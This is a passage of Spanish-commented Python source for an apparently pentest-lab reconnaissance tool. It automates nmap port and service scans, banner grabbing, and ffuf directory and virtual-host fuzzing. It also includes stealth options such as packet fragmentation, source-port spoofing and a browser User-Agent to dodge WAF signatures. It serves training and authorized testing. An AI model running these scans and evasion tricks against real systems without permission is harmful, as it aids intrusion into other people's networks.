UDP_PORTS = "53,69,111,123,137,161,500,623,1434,1900,5353"

# TLDs de lab para descubrir el dominio de los servicios enumerados.
_DOM_RE = re.compile(r"\b([a-z0-9][a-z0-9.\-]*\.(?:htb|local|lan|thm|box|vl|corp|internal))\b", re.I)

# commands.log: ruta POR HILO (thread-local). Con --jobs cada objetivo corre en su propio
# hilo y escribe en SU commands.log, sin pisarse con los demás. Con --jobs 1 (por defecto)
# hay un único hilo y se comporta igual que un global de siempre.
_TLS = threading.local()
_HOSTS_LOCK = threading.Lock()   # serializa escrituras a /etc/hosts con --add-hosts + --jobs


def _set_commands_log(path):
    _TLS.commands_log = path


def _commands_log():
    return getattr(_TLS, "commands_log", None)


class _TaggedStdout:
    """Antepone una etiqueta «[ip] » a cada línea que escribe un hilo, para que con --jobs
    la salida entrelazada de varios objetivos siga siendo legible. Thread-safe. Los hilos
    sin etiqueta (el principal) escriben tal cual. OJO: la salida EN VIVO de nmap/ffuf la
    emiten ellos directo al fd heredado, así que no pasa por aquí y no va etiquetada — por
    eso con --jobs te apoyas en el report.html/commands.log de cada objetivo."""
    def __init__(self, real):
        self._real = real
        self._lock = threading.Lock()
        self._bol = True            # ¿a principio de línea? (aproximado con entrelazado)

    def write(self, s):
        tag = getattr(_TLS, "tag", "")
        with self._lock:
            if not tag:
                return self._real.write(s)
            buf = []
            for ch in s:
                if self._bol and ch != "\n":
                    buf.append(tag)
                    self._bol = False
                buf.append(ch)
                if ch == "\n":
                    self._bol = True
            return self._real.write("".join(buf))

    def flush(self):
        with self._lock:
            self._real.flush()

    def __getattr__(self, n):        # isatty/fileno/encoding… delegan al stdout real
        return getattr(self._real, n)


# ───────────────────────── Utilidades ─────────────────────────
def _log(line):
    path = _commands_log()
    if path:
        try:
            with open(path, "a") as f:
                f.write(line + "\n")
        except OSError:
            pass


_ANSI_RE = re.compile(r"\x1b\[[0-9;?]*[ -/]*[@-~]")   # color/CSI que algunas tools (enum4linux-ng) emiten aunque no sea un TTY


def run(cmd, timeout=None, outfile=None, quiet_stdout=False):
    """Ejecuta un comando: lo muestra, lo registra, y borra su fichero de salida
    ANTES de lanzarlo (para no reparsear datos viejos si el comando falla).
    `quiet_stdout`: descarta el STDOUT del proceso (stderr sigue en pantalla, por si
    avisa de algo real) — para comandos cuyo stdout en vivo es puro ruido porque
    palantir YA pinta su propio resumen después de leer el -o/-of (ffuf: cada
    coincidencia la imprime por su cuenta en stdout aunque -s, que solo calla la
    barra de progreso — sin esto, cada fuzzing dejaba cientos de palabras sueltas
    sin contexto ANTES del resumen limpio, duplicado y sin aportar nada)."""
    if outfile:
        try:
            Path(outfile).unlink()
        except OSError:
            pass
    line = shlex.join(cmd)
    print(f"{C_GREY}    $ {line}{C_RESET}", flush=True)
    _log(line)
    try:
        return subprocess.run(cmd, timeout=timeout,
                              stdout=subprocess.DEVNULL if quiet_stdout else None)
    except subprocess.TimeoutExpired:
        warn(f"'{cmd[0]}' superó el timeout de {timeout}s; sigo con lo que haya.")
        return None
    except FileNotFoundError:
        err(f"no se encuentra '{cmd[0]}' en el PATH."); return None


def run_capture(cmd, timeout=None, input_text=None, env=None, quiet=False):
    """Como run(), pero CAPTURA stdout+stderr para meterlo en el informe.
    Devuelve (rc, texto). rc=None si el binario no existe o salta el timeout
    (en ese caso 'texto' trae la salida parcial que hubiera). Si 'env' es un dict,
    se fusiona sobre os.environ: así se pasan secretos (MYSQL_PWD, PGPASSWORD…) por
    entorno en vez de en la línea de comandos (no quedan en el log ni en 'ps').
    `quiet=True` NO imprime el '$ comando' en pantalla (sigue yendo a commands.log
    igual) — para cuando la llamada se repite muchísimas veces (p. ej. Fase 5d con
    --user-list/--pass-list grandes) y el eco de cada una inundaría la terminal."""
    line = shlex.join(cmd)
    if not quiet:
        print(f"{C_GREY}    $ {line}{C_RESET}", flush=True)
    _log(line)
    full_env = {**os.environ, **env} if env else None
    try:
        r = subprocess.run(cmd, timeout=timeout, capture_output=True,
                           text=True, errors="replace", input=input_text, env=full_env)
        return r.returncode, _ANSI_RE.sub("", (r.stdout or "") + (r.stderr or "")).strip()
    except subprocess.TimeoutExpired as e:
        warn(f"'{cmd[0]}' superó el timeout de {timeout}s; uso la salida parcial.")
        out = e.stdout or ""
        if isinstance(out, bytes):
            out = out.decode("latin-1", "replace")
        return None, _ANSI_RE.sub("", out).strip()
    except FileNotFoundError:
        return None, ""


def _run_capture_retry(cmd, timeout=None, quiet=False, retries=1):
    """Como run_capture, pero reintenta si la salida viene COMPLETAMENTE vacía (ni stdout
    ni stderr) — contra un objetivo real, un comando (nxc, ldapsearch…) puede fallar de forma
    TRANSITORIA (timing/latencia de la conexión SMB/LDAP, sobre todo si acaban de correr varias
    llamadas seguidas contra el mismo host) incluso cuando la petición es legítima y debería
    devolver datos: visto en vivo contra un DC real, donde --shares/--pass-pol/--rid-brute (con
    una credencial que ACABA de validarse segundos antes) y también una consulta ldapsearch
    anónima salieron vacíos/con timeout en palantir, pero el MISMO comando, repetido a mano
    minutos después, funcionó perfectamente. Útil en cualquier punto donde un fallo real
    (credencial mala, host caído) no se confunda con uno transitorio: si el fallo fuera real,
    reintentar no cambiaría nada. Si sigue vacío tras los reintentos, lo dice explícitamente en
    el texto devuelto — para que el informe no lo confunda con "comprobado, sin hallazgos"
    cuando en realidad el comando no llegó a correr de verdad."""
    rc, out = run_capture(cmd, timeout=timeout, quiet=quiet)
    tries = 0
    while not (out or "").strip() and tries < retries:
        tries += 1
        rc, out = run_capture(cmd, timeout=timeout, quiet=quiet)
    if not (out or "").strip():
        out = ("(sin salida, ni siquiera tras reintentar — probable fallo transitorio de la "
               "conexión contra el objetivo, NO necesariamente que no haya nada que ver aquí; "
               "repite este comando a mano)")
    return rc, out


def have(tool):
    """¿Está la herramienta en el PATH?"""
    return shutil.which(tool) is not None


def sanitize(s):
    """Quita bytes de control de texto venido del objetivo (evita spoof del terminal),
    pero CONSERVA tabuladores y saltos de línea: el informe los necesita para no aplastar
    la salida multi-línea (rpcdump, enum4linux…) en un único párrafo gigante."""
    return "".join(ch if 32 <= ord(ch) < 127 or ch in "\t\n" else " " for ch in s)


_BAD_XML = re.compile(r"&#x?0*(?:[0-8bcefBCEF]|1[0-9a-fA-F])\b;?|&#0*(?:[0-9]|1[0-9]|2[0-9]|3[01]);")


def scan_type():
    # --tcp-connect (o el auto-fallback de run_one) fuerza connect scan (-sT) aunque haya
    # root: en WSL2 mirrored + VPN de HTB los SYN raw (-sS) se pierden en el túnel y
    # nmap da "host up" con 0 puertos (falso negativo total). -sT usa la pila del SO.
    if CONNECT:
        return "-sT"
    root = os.name == "posix" and hasattr(os, "geteuid") and os.geteuid() == 0
    return "-sS" if root else "-sT"


def is_root():
    return os.name == "posix" and hasattr(os, "geteuid") and os.geteuid() == 0


def default_outdir_home():
    """Dónde guardar resultados por defecto. Bajo sudo, Path.home() sería /root y
    los informes quedarían inaccesibles sin sudo; usamos el home del usuario REAL
    (SUDO_USER → p. ej. /home/kali). Si se corre como root de verdad (sin sudo) y
    hay un único usuario normal en /home, se usa ese. En otro caso, Path.home()."""
    if os.name != "posix":
        return Path.home()
    import pwd
    sudo_user = os.environ.get("SUDO_USER")
    if sudo_user:
        try:
            return Path(pwd.getpwnam(sudo_user).pw_dir)
        except KeyError:
            pass
    if is_root() and Path("/home").is_dir():
        homes = [d for d in Path("/home").iterdir() if d.is_dir()]
        if len(homes) == 1:                  # Kali personal: un solo usuario → su home
            return homes[0]
    return Path.home()


# ───────────────────────── Parseo de XML de Nmap ─────────────────────────
def parse_nmap_xml(path):
    """Devuelve {'ports':[...], 'host':{id:out}} o None si el XML falta/no parsea."""
    try:
        text = Path(path).read_text(errors="replace")
    except OSError:
        return None
    text = _BAD_XML.sub("", text)
    try:
        root = ET.fromstring(text)
    except ET.ParseError:
        return None
    ports, hostscripts = [], {}
    for host in root.findall("host"):
        for port in host.findall("./ports/port"):
            st = port.find("state")
            state = st.get("state") if st is not None else ""
            if "open" not in state:
                continue
            svc = port.find("service")
            svc = svc.attrib if svc is not None else {}
            scripts = {s.get("id"): (s.get("output") or "").strip()
                       for s in port.findall("script")}
            ports.append({
                "port": int(port.get("portid")), "proto": port.get("protocol"),
                "state": state, "name": svc.get("name", ""),
                "product": svc.get("product", ""), "version": svc.get("version", ""),
                "extrainfo": svc.get("extrainfo", ""), "tunnel": svc.get("tunnel", ""),
                "scripts": scripts, "banner": "",
            })
        for s in host.findall("./hostscript/script"):
            hostscripts[s.get("id")] = (s.get("output") or "").strip()
    return {"ports": ports, "host": hostscripts}


def version_str(p):
    s = " ".join(x for x in (p["product"], p["version"]) if x)
    if p["extrainfo"]:
        s += f" ({p['extrainfo']})"
    return s.strip()


# ───────────────────────── Fases de escaneo ─────────────────────────
CONNECT = False  # --tcp-connect (o auto-fallback): fuerza connect scan -sT aunque haya root
TUNNEL = False   # --tunnel/--pivoting: timing de nmap apto para túnel/pivot (ligolo-ng, chisel, SOCKS…)
RESUME = False   # --resume: reutiliza los XML de nmap ya existentes en vez de re-escanear
NIKTO = False    # --nikto: corre nikto de verdad contra cada web (opt-in, lento — si no, solo se sugiere)
CMS_SCAN = False  # --cms-scan: wpscan/joomscan si whatweb detecta WordPress/Joomla (opt-in, lento)
CRAWL = False    # --crawl: katana (crawling real: sigue enlaces/JS/formularios, no adivina) (opt-in)
NUCLEI = False   # --nuclei: plantillas de nuclei (CVEs/exposiciones/misconfig) contra cada web (opt-in)
SPIDER = False   # --spider: spidering de CONTENIDO de shares SMB con nxc (--spider --content), busca secretos dentro de los ficheros (opt-in, lento)
SPIDER_PATTERN = None  # --pattern: patrón(es) para --spider (si no, un regex de secretos por defecto)


def _nmap_run(cmd, timeout, outfile):
    """Lanza nmap, o —con --resume— reutiliza el XML existente si ya está y parsea,
    para no repetir un escaneo lento (-p-, -sV…) al iterar sobre la misma caja."""
    if RESUME and Path(outfile).is_file() and parse_nmap_xml(outfile) is not None:
        print(f"{C_GREY}    $ [--resume] reutilizo el nmap existente: {outfile}{C_RESET}", flush=True)
        return
    _TLS.nmap_fresh_scan = True   # bajo --resume: hubo que re-escanear de verdad (XML ausente/corrupto) —
                                  # run_one() lo usa para NO reutilizar footprint/creds/searchsploit viejos
                                  # (los puertos/servicios pueden haber cambiado de verdad)
    run(cmd, timeout=timeout, outfile=outfile)


def _parse_ports(s):
    """'PUERTO[,PUERTO...]' → lista de ints válidos (1-65535), sin duplicados, ordenada.
    Un token inválido se avisa y se descarta (nunca rompe el escaneo)."""
    out = []
    for tok in (s or "").split(","):
        tok = tok.strip()
        if not tok:
            continue
        if not tok.isdigit() or not (1 <= int(tok) <= 65535):
            warn(f"--port: '{tok}' no es un puerto válido (1-65535), lo ignoro.")
            continue
        out.append(int(tok))
    return sorted(dict.fromkeys(out))


def _fast_scan_timing(stealth, tunnel, min_rate):
    """Flags de timing de nmap para el barrido de puertos (Fase 1), según el modo:
    - stealth: -T2 + fragmentación + relleno (sigilo, muy lento).
    - tunnel/pivoting: -T3, SIN --min-rate y con --max-retries 10 (el DEFAULT de nmap, no
      menos). Por un túnel (ligolo-ng, chisel, SOCKS, WSL2+VPN…) la pila TCP es userland y
      se satura: un --min-rate fijo inunda el relay y nmap marca 'filtered' puertos
      ABIERTOS cuyas respuestas se perdieron (visto: WinRM 5985 desaparecía). Sin
      --min-rate, nmap baja el ritmo solo al detectar pérdida (su control de congestión,
      que el --min-rate anulaba); 10 reintentos (el nmap -sT básico que SÍ encontró el
      5985 llevaba ese default — bajarlo a 3, como estaba antes, era justo lo contrario de
      lo que hace falta en un enlace con pérdidas) dan margen a recuperar los probes
      caídos (confirmado en vivo: `nmap -sT -p-` por ligolo-ng con el default de 10 encuentra
      3389 Y 5985; lo que fallaba era el --max-retries 3 de la 1ª versión). El alcance NO se
      recorta: el -p- completo funciona por túnel con 10 reintentos (lento pero sin perder
      nada); --top deja la versión rápida (top-1000).
    - normal: -T4 --min-rate a tope (rápido y ruidoso, para enlace directo).
    stealth tiene prioridad sobre tunnel: su timing es aún más suave y también sirve por
    túnel (el -sT lo fuerza aparte CONNECT)."""
    if stealth:
        return ["-T2", "-f", "--data-length", "24"]
    if tunnel:
        return ["-T3", "--max-retries", "10"]
    return ["-T4", "--min-rate", str(min_rate), "--max-retries", "2"]


_SWEEP_UP_RE = re.compile(r"Host:\s+(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})\b.*Status:\s+Up", re.I)


def _parse_sweep_up(gnmap):
    """IPs 'Status: Up' de la salida greppable (-oG) de nmap -sn."""
    return {m.group(1) for m in _SWEEP_UP_RE.finditer(gnmap or "")}


def _is_multihost_spec(s):
    """¿`s` es un CIDR (>1 host) o un rango a.b.c.d-e? (los únicos que el sweep puede podar)."""
    s = (s or "").strip()
    if not s or s.startswith("#"):
        return False
    try:
        net = ipaddress.ip_network(s, strict=False)
        return "/" in s and net.num_addresses > 1
    except ValueError:
        return bool(re.match(r"^\d{1,3}(\.\d{1,3}){3}-\d{1,3}$", s))


def _sweepable_ips(specs):
    """IPs que SALEN de expandir un CIDR o un rango — las únicas que el ping-sweep puede
    descartar. Una IP suelta (o /32) y un hostname escritos a mano NO entran: el usuario los
    quiere sí o sí (una box de HTB no responde a ping — por eso el escaneo va con -Pn)."""
    out = set()
    for s in specs:
        if not _is_multihost_spec(s):
            continue
        s = s.strip()
        try:
            net = ipaddress.ip_network(s, strict=False)
            out.update(str(h) for h in (list(net.hosts()) or [net.network_address]))
            continue
        except ValueError:
            pass
        m = re.match(r"^(\d{1,3}\.\d{1,3}\.\d{1,3}\.)(\d{1,3})-(\d{1,3})$", s)
        if m and 0 <= int(m.group(2)) <= int(m.group(3)) <= 255:
            base, lo, hi = m.group(1), int(m.group(2)), int(m.group(3))
            out.update(f"{base}{i}" for i in range(lo, hi + 1))
    return out


def host_discovery(sweep_specs, source_port=None):
    """Fase 0: nmap -sn sobre los CIDR/rangos `sweep_specs` (UN solo proceso). En segmento
    local nmap usa ARP (fiable e imposible de bloquear a nivel L2); enrutado, ICMP echo +
    timestamp + TCP SYN/ACK a 80/443. Devuelve el set de IPs vivas, o None si nmap ni llegó a
    correr (None = no filtrar, escanear todas). Así una /24 con 50 vivas no se come 200
    escaneos -p- de hosts muertos."""
    cmd = ["nmap", "-sn", "-n"]
    if source_port:
        cmd += ["--source-port", str(source_port)]
    cmd += ["-oG", "-"] + list(sweep_specs)
    phase("Fase 0 — descubrimiento de hosts vivos (nmap -sn) sobre el rango/CIDR",
          "un -p- de 65535 puertos por host es carísimo; barrer primero quién responde evita "
          "escanear fantasmas (en una /24 con 50 vivas, ahorra 200 escaneos completos)")
    rc, out = run_capture(cmd, timeout=600)
    if rc is None and not out:
        warn("el ping-sweep no llegó a correr (¿nmap en el PATH?); sigo sin filtrar."); return None
    return _parse_sweep_up(out)


def fast_ports(ip, nmapdir, min_rate, top, stealth=False, source_port=None, ports=None, tunnel=False):
    prefix = str(nmapdir / "fast")
    cmd = ["nmap", scan_type(), "-Pn", "-n", "--open", "-oA", prefix]
    cmd += _fast_scan_timing(stealth, tunnel, min_rate)
    if source_port:
        cmd += ["--source-port", str(source_port)]
    if ports:
        cmd += ["-p", ",".join(map(str, ports))]
    else:
        cmd += ["--top-ports", "1000"] if top else ["-p-"]
    cmd.append(ip)
    tag = " [sigiloso, mucho más lento]" if stealth else (" [modo túnel: sin --min-rate, +reintentos]" if tunnel else "")
    if ports:
        label = f"puerto(s) indicado(s): {','.join(map(str, ports))}"
    else:
        label = "top-1000" if top else "todos"
    phase(f"Fase 1 — descubrimiento de puertos ({label}){tag}",
          "un escaneo de los 65535 puertos revela TODO lo que escucha; los servicios jugosos suelen estar en puertos altos no estándar"
          if not ports else "ya sabes el puerto (p. ej. un lab con un puerto aleatorio dado) → nos saltamos el barrido completo")
    _nmap_run(cmd, 3600 if (stealth or tunnel) else 1200, prefix + ".xml")
    parsed = parse_nmap_xml(prefix + ".xml")
    if parsed is None:
        err("Fase 1 falló (nmap sin salida válida)."); return None
    nums = sorted(p["port"] for p in parsed["ports"])
    if nums:
        good(f"Puertos abiertos: {', '.join(map(str, nums))}")
    return nums


def deep_scan(ip, ports, nmapdir, scripts, tag, script_timeout, host_timeout=None,
              stealth=False, source_port=None, hostname=None, tunnel=False):
    prefix = str(nmapdir / tag)
    cmd = ["nmap", scan_type(), "-sV", "-Pn", "-n", "-p", ",".join(map(str, ports)),
           "--script", ",".join(scripts), "--script-timeout", script_timeout]
    if hostname:
        # Los scripts http-* (http-title, http-enum, http-headers…) mandan el Host:
        # que les dé la librería NSE — contra la IP desnuda, un WAF/CDN con SNI
        # (Cloudflare) les da el 403/bloqueo genérico a TODOS por igual. El resto de
        # scripts (ssh-*, smb-*…) ignoran este script-arg sin más, es seguro pasarlo
        # siempre que se conozca el hostname.
        cmd += ["--script-args", f"http.host={hostname}"]
    if stealth:
        # -f (fragmentación) exige socket crudo: con -sT (sin root) + -sV, nmap no lo
        # ignora como hace en un escaneo de puertos simple — aborta con "QUITTING!"
        # y la Fase 2 entera se pierde. Solo se añade si de verdad hay -sS (root).
        cmd += ["-T2", "-f"] if is_root() else ["-T2"]
    elif tunnel:
        # Por túnel/pivot: -T3 y --max-retries 10 (el default de nmap, no menos) para que
        # -sV + scripts no pierdan puertos por probes caídos en la pila userland del relay
        # (mismo motivo que la Fase 1). Aquí es barato: la Fase 2 va sobre los pocos puertos
        # ya encontrados, no sobre los 65535.
        cmd += ["-T3", "--max-retries", "10"]
    if source_port:
        cmd += ["--source-port", str(source_port)]
    if host_timeout:
        cmd += ["--host-timeout", host_timeout]
    cmd += ["-oA", prefix, ip]
    _nmap_run(cmd, 4800 if (stealth or tunnel) else 2400, prefix + ".xml")
    return parse_nmap_xml(prefix + ".xml")


def merge_scripts(base, extra):
    """Funde la salida NSE de un 2º escaneo (agresivo) en el 1º, por puerto y host."""
    if not extra:
        return
    byport = {p["port"]: p for p in base["ports"]}
    for p in extra["ports"]:
        byport.get(p["port"], {}).get("scripts", {}).update(p["scripts"])
    base["host"].update(extra["host"])


def udp_scan(ip, nmapdir, stealth=False, source_port=None, tunnel=False):
    prefix = str(nmapdir / "udp")
    # UDP por túnel es poco fiable de por sí (muchos relays SOCKS ni lo pasan); aun así, si
    # se intenta, -T3 + 1 reintento extra da algo más de margen que el -T4 directo.
    timing = "-T2" if stealth else ("-T3" if tunnel else "-T4")
    cmd = ["nmap", "-sU", "-Pn", "-n", timing,
           "--max-retries", "2" if tunnel else "1", "--open",
           "-p", UDP_PORTS, "-sV", "--version-intensity", "0"]
    if source_port:
        cmd += ["--source-port", str(source_port)]
    cmd += ["-oA", prefix, ip]
    phase("Fase 3 — barrido UDP (puertos habituales)",
          "servicios críticos (DNS, SNMP, IPMI, TFTP) hablan UDP y un escaneo TCP no los ve; "
          "se hace aquí, justo tras la Fase 2 y antes del banner grabbing/footprinting, para "
          "que si aparece SNMP o IPMI por UDP, la Fase 5 ya los tenga disponibles")
    _nmap_run(cmd, 900, prefix + ".xml")
    parsed = parse_nmap_xml(prefix + ".xml")
    return parsed["ports"] if parsed else []


# ───────────────────────── Banner grabbing ─────────────────────────
def grab_banner(ip, port, timeout=3.0, web=False, source_port=None):
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(timeout)
            if source_port:              # mismo truco que --source-port en nmap: la
                s.bind(("", source_port))  # conexión real también tiene que salir "de confianza"
            s.connect((ip, port))
            try:
                data = s.recv(256)
            except socket.timeout:
                data = b""
            if not data and web:                 # el HEAD solo a puertos web
                try:
                    s.sendall(b"HEAD / HTTP/1.0\r\n\r\n")
                    data = s.recv(256)
                except OSError:
                    data = b""
            return _clean(data)
    except (OSError, ValueError):                 # ValueError: hostname>63, etc.
        return ""


def _clean(b):
    txt = "".join(ch if 32 <= ord(ch) < 127 else " " for ch in b.decode("latin-1"))
    return " ".join(txt.split())[:120]


def grab_all_banners(ports, source_port=None):
    phase("Fase 4 — banner grabbing manual",
          "abrir un socket a cada puerto y leer el saludo descubre servicios que nmap dejó como 'unknown'")
    ip_ports = [(p["ip"], p) for p in ports]
    # Por un túnel/pivot (TUNNEL): cada banner es un socket propio, y 16 a la vez saturan la pila
    # TCP userland del relay EXACTAMENTE igual que un --min-rate alto en nmap — justo lo que
    # --tunnel evita en las Fases 1/2, así que sería incoherente inundarlo aquí. Se baja a 4 en
    # paralelo y se sube el timeout de 3→8s: un servicio al otro lado de un pivot tarda más en
    # saludar (RTT del túnel + jitter), y con 3s muchos saldrían como "sin banner" por falso corte.
    workers = 4 if TUNNEL else 16
    bto = 8.0 if TUNNEL else 3.0
    with concurrent.futures.ThreadPoolExecutor(max_workers=workers) as ex:
        futs = {ex.submit(grab_banner, ip, p["port"], timeout=bto, web=is_web(p), source_port=source_port): p
                for ip, p in ip_ports}
        try:
            for f in concurrent.futures.as_completed(futs):
                futs[f]["banner"] = f.result()
        except KeyboardInterrupt:
            ex.shutdown(cancel_futures=True); raise


# ───────────────────────── Detección web / extensiones ─────────────────────────
def is_web(p):
    n = p["name"]
    if p["port"] in (5985, 5986, 47001):   # WinRM/WSMan: hablan HTTP pero no son web fuzzeable
        return False
    # HTTP.sys crudo (Microsoft-HTTPAPI): lo usan WinRM/WSMan/SSDP/UPnP y devuelve
    # 404 a todo → no es una web real, fuzzearlo es tiempo perdido.
    if "httpapi" in (p["product"] + " " + p["scripts"].get("http-server-header", "")).lower():
        return False
    if n == "http-proxy" or n.startswith("ncacn") or n == "http-rpc-epmap":
        return False
    if n.startswith("http") or n in ("https", "http-alt", "ssl/http"):
        return True
    if p["tunnel"] == "ssl" and (n in ("", "unknown") or "http" in n):
        return True
    if p.get("banner", "").startswith("HTTP/"):   # Nmap lo dejó unknown pero habla HTTP
        return True
    # Puerto que nmap no identificó pero en un puerto web habitual (dev servers incluidos): trátalo
    # como web para el fuzzing. nmap casi siempre fingerprintea HTTP aunque esté en un puerto raro;
    # esto cubre cuando no lo logra y el servidor no saluda (los HTTP no hablan primero → banner
    # vacío, no detectable por banner).
    if n in ("", "unknown", "tcpwrapped") and p["port"] in (
            80, 443, 8000, 8008, 8080, 8081, 8088, 8443, 8888, 3000, 5000, 9090):
        return True
    return False


def web_scheme(p):
    if p["tunnel"] == "ssl" or "https" in p["name"] or p["port"] in (443, 8443):
        return "https"
    return "http"


def guess_extensions(p):
    blob = " ".join([p["product"], p["version"], p["extrainfo"], p["name"],
                     p["scripts"].get("http-server-header", ""),
                     p["scripts"].get("http-headers", ""),
                     p["scripts"].get("http-generator", "")]).lower()
    exts = ["html", "txt"]
    if "iis" in blob or "asp.net" in blob or "aspnet" in blob:
        exts += ["asp", "aspx", "ashx", "asmx"]
    if "php" in blob:
        exts += ["php"]
    if any(k in blob for k in ("tomcat", "jboss", "servlet", "jsp")):
        exts += ["jsp", "do", "action"]
    if "apache" in blob:
        exts += ["cgi"]
    if "php" not in exts and any(k in blob for k in ("apache", "nginx", "ubuntu", "debian")):
        exts += ["php"]
    return ",".join("." + e for e in dict.fromkeys(exts))


# ───────────────────────── ffuf ─────────────────────────
# El User-Agent por defecto de ffuf ("Fuzz Faster U Fool/...") es una firma
# reconocible en logs/WAF; en modo sigiloso se sustituye por uno de navegador.
_STEALTH_UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
               "(KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36")


def run_ffuf(url, wordlist, outfile, scheme, extra, stealth=False, proxy=None, fs=None):
    """Lanza ffuf con salida JSON y devuelve la lista de results (o []).
    `fs`: si se da, filtra por tamaño exacto (`-fs <fs>`) en vez de autocalibrar (`-ac`)
    — para el catch-all de vhost donde `-ac` calibra sobre la página comodín y filtra TODO."""
    cmd = ["ffuf", "-u", url, "-w", wordlist, "-o", str(outfile), "-of", "json",
           "-ic", "-s", "-noninteractive"]
    cmd += ["-fs", str(fs)] if fs is not None else ["-ac"]
    if stealth:
        cmd += ["-t", "5", "-p", "0.5-1.5", "-maxtime", "1800", "-H", f"User-Agent: {_STEALTH_UA}"]
    else:
        cmd += ["-t", "40", "-maxtime", "600"]
    if proxy:
        cmd += ["-x", proxy]
    cmd += extra
    if scheme == "https":
        cmd.append("-k")
    run(cmd, timeout=2100 if stealth else 900, outfile=outfile, quiet_stdout=True)
    try:
        return json.loads(Path(outfile).read_text()).get("results", [])
    except (OSError, json.JSONDecodeError):
        return []


def fuzz_dirs(ip, p, wordlists, ext, webdir, stealth=False, proxy=None, hostname=None, host_header=None):
    scheme = web_scheme(p)
    # host_header: fuzzear un vhost CONCRETO sin depender de DNS/hosts → conectamos a la IP
    # y mandamos Host: <vhost> por cabecera (con -k el cert/SNI no importan en https). Si no,
    # comportamiento normal: se conecta al hostname (que resuelve por /etc/hosts) o a la IP.
    if host_header:
        target, extra_h, otag = ip, ["-H", f"Host: {host_header}"], host_header
    else:
        target, extra_h, otag = (hostname or ip), [], "root"
    url = f"{scheme}://{target}:{p['port']}/FUZZ"
    extra = (["-e", ext] if ext else []) + extra_h
    otag = re.sub(r"[^A-Za-z0-9_.-]", "_", otag)
    hits = {}
    for wl in wordlists:
        outfile = webdir / f"ffuf_{p['port']}_{otag}_{Path(wl).stem}.json"
        for r in run_ffuf(url, wl, outfile, scheme, extra, stealth=stealth, proxy=proxy):
            path = r.get("input", {}).get("FUZZ")
            if path is None:
                continue
            hits[(path, r.get("status"))] = {"path": path, "status": r.get("status"),
                                             "length": r.get("length")}
    return list(hits.values())


def _vhost_sig(ip, p, host):
    """Firma (status, len, muestra) de la respuesta web para un `Host` dado. Distingue
    un vhost real del catch-all/comodín (responde IGUAL a cualquier Host). Comparable
    dentro de una misma ejecución."""
    st, _h, body = _http_get(f"{web_scheme(p)}://{ip}:{p['port']}/", host=host)
    return (st, len(body), body[:200])


def _drop_catchall(hits, control_sig, sig_of):
    """Descarta los hits cuya firma == la del control (un Host aleatorio inexistente):
    son el comodín/catch-all, no vhosts reales. Puro (`sig_of` inyectable) → testable
    sin red. Si no se pudo establecer baseline (status None), no filtra nada (mejor un
    falso positivo que tirar un vhost real por un fallo de red/TLS)."""
    if control_sig[0] is None:
        return hits
    return [h for h in hits if sig_of(h) != control_sig]


def fuzz_vhost(ip, p, domain, wordlist, webdir, stealth=False, proxy=None):
    scheme = web_scheme(p)
    outfile = webdir / f"ffuf_vhost_{p['port']}.json"
    hdr = ["-H", f"Host: FUZZ.{domain}"]
    url = f"{scheme}://{ip}:{p['port']}/"

    def _collect(results):
        o = []
        for r in results:
            sub = r.get("input", {}).get("FUZZ")
            if sub is not None:
                o.append({"host": f"{sub}.{domain}", "status": r.get("status"),
                          "length": r.get("length")})
        return o

    out = _collect(run_ffuf(url, wordlist, outfile, scheme, hdr, stealth=stealth, proxy=proxy))
    # Catch-all puro: contra un servidor que responde IGUAL a cualquier Host, el -ac de
    # ffuf calibra sobre esa página comodín y puede filtrar TODO (devuelve []). Si así fue,
    # medimos el tamaño de un Host inexistente y reintentamos con -fs <len> (deja pasar solo
    # lo que difiere del comodín) en vez de -ac. Luego el filtro por firma de abajo limpia
    # cualquier resto de comodín que el -fs no pillara (tamaños que no casan al byte).
    if not out:
        base = _vhost_sig(ip, p, os.urandom(6).hex() + "." + domain)
        if base[0] is not None:
            out = _collect(run_ffuf(url, wordlist, outfile, scheme, hdr,
                                    stealth=stealth, proxy=proxy, fs=base[1]))
    # Guarda anti-comodín: aunque ffuf use -ac/-fs, un catch-all que redirige/sirve lo mismo
    # para CUALQUIER Host puede colar un hit basura (p. ej. una cadena aleatoria como
    # vhost "real"). Medimos la firma de un Host inexistente y tiramos lo que casa.
    if out:
        control = _vhost_sig(ip, p, os.urandom(6).hex() + "." + domain)
        out = _drop_catchall(out, control, lambda h: _vhost_sig(ip, p, h["host"]))
    return out


def _mirror_map(webs, root_redirect):
    """{puerto_http_espejo: puerto_https_destino} para los puertos HTTP cuya raíz redirige
    permanentemente a HTTPS (el clásico sitio servido en 80 y 443: 80 solo reenvía a 443).
    Puro: `root_redirect(p)` devuelve la cabecera Location (o '') de la raíz de ese puerto
    → testable sin red."""
    https_ports = sorted(p["port"] for p in webs if web_scheme(p) == "https")
    if not https_ports:
        return {}
    tgt = 443 if 443 in https_ports else https_ports[0]
    mirrors = {}
    for p in webs:
        if web_scheme(p) == "https":
            continue
        if (root_redirect(p) or "").lower().startswith("https://"):
            mirrors[p["port"]] = tgt
    return mirrors


def primary_web_ports(ip, webs):
    """Separa los puertos web a procesar a fondo (primarios) de los ESPEJO (un HTTP que
    solo redirige a su versión HTTPS). Así el fuzzing/crawl del MISMO sitio no se hace dos
    veces (80 y 443). Devuelve (primarios, {puerto_espejo: puerto_destino})."""
    def redir(p):
        st, hdrs, _ = _http_get(f"{web_scheme(p)}://{ip}:{p['port']}/", follow=False)
        return hdrs.get("location", "") if st in (301, 302, 307, 308) else ""
    mirrors = _mirror_map(webs, redir)
    return [p for p in webs if p["port"] not in mirrors], mirrors


def _parse_hostnames(s):
    """'host1,host2' → lista de hostnames en minúsculas, sin vacíos, deduplicada."""
    return sorted({h.strip().lower() for h in (s or "").split(",") if h.strip()})


def fp_vhost_web(ip, webs, vhosts):
    """Repite el fingerprint web (whatweb) pero con el `Host:` correcto de cada vhost
    CONFIRMADO (Fase 7: por fuzzing o por --vhost-names). Sin esto, el whatweb de
    fp_web solo ve el vhost por DEFECTO del servidor (normalmente el primero del
    config) — nunca los demás, que pueden servir contenido bien distinto (versión
    de Apache, CMS, SO: justo lo que pregunta el lab Virtual Hosts del CPTS)."""
    names = sorted({h["host"] for _, hits in vhosts for h in hits})
    res = _fp("vhost-web", "Fingerprint por vhost", sorted({p["port"] for p in webs}))
    if not names:
        return res
    if not have("whatweb"):
